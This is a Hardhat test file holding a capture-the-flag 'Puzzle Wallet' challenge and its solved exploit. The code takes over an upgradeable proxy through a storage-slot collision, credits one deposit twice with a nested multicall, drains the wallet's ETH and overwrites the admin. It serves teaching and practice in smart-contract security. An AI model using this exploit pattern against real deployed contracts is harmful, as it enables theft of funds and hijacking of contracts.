const { ethers } = require("hardhat");
const { expect } = require("chai");

/*

Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

  You'll need to hijack this wallet to become the admin of the proxy.

  Things that might help::

- Understanding how delegatecalls work and how msg.sender and msg.value behaves when performing one.
- Knowing about proxy patterns and the way they handle storage variables.

*/

describe("[Challenge] Puzzle Wallet", function () {
  let deployer, attacker;

  const iface = new ethers.utils.Interface([
    "function init(uint256)",
    "function deposit()",
    "function multicall(bytes[])",
  ]);
  const INITIAL_DEPOSIT = ethers.utils.parseEther("0.001");
  const FINAL_DEPOSIT = ethers.utils.parseEther("0.002");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    this.puzzleWalletLogic = await (
      await ethers.getContractFactory("PuzzleWallet", deployer)
    ).deploy();

    const init_enc = iface.encodeFunctionData("init", [0x12345678]);
    this.puzzleProxy = await (
      await ethers.getContractFactory("PuzzleProxy", deployer)
    ).deploy(deployer.address, this.puzzleWalletLogic.address, init_enc);

    this.puzzleWalletInstance = (
      await ethers.getContractFactory("PuzzleWallet")
    ).attach(this.puzzleProxy.address);

    await this.puzzleWalletInstance.addToWhitelist(deployer.address);

    await this.puzzleWalletInstance.deposit({ value: INITIAL_DEPOSIT });
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    // puzzleWalletInstance - owner
    const owner = await this.puzzleWalletInstance.owner();
    expect(owner).to.eq(deployer.address);

    // puzzleProxy slot 0 - pendingAdmin is equivalent to puzzleWalletInstance slot 0 - owner
    // change puzzleWalletInstance - owner by calling `proposeNewAdmin`
    await this.puzzleProxy.connect(attacker).proposeNewAdmin(attacker.address);

    const newOwner = await this.puzzleWalletInstance.owner();
    expect(newOwner).to.eq(attacker.address);

    // now attacker is owner, `addToWhitelist` can be called to whitelist attacker
    await this.puzzleWalletInstance
      .connect(attacker)
      .addToWhitelist(attacker.address);

    // attacker should be whitelisted
    const isWhitelisted = await this.puzzleWalletInstance.whitelisted(
      attacker.address
    );
    expect(isWhitelisted).to.eq(true);

    // in nested multicall
    // register 2 deposits with only 1 was made
    const dep_enc = iface.encodeFunctionData("deposit", []);
    const mul_enc = iface.encodeFunctionData("multicall", [[dep_enc]]);
    await this.puzzleWalletInstance
      .connect(attacker)
      .multicall([dep_enc, mul_enc], { value: INITIAL_DEPOSIT });

    // balances of attacker should be 0.002 with just 0.001 deposited
    const balAttacker = await this.puzzleWalletInstance
      .connect(attacker)
      .balances(attacker.address);
    expect(balAttacker).to.eq(FINAL_DEPOSIT);

    // withdraw all eth from contract
    await this.puzzleWalletInstance
      .connect(attacker)
      .execute(attacker.address, FINAL_DEPOSIT, []);

    // call `setMaxBalance` to change data in slot1 = admin
    await this.puzzleWalletInstance
      .connect(attacker)
      .setMaxBalance(attacker.address);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    const newAdmin = await this.puzzleProxy.admin();
    expect(newAdmin).to.eq(attacker.address);
  });
});
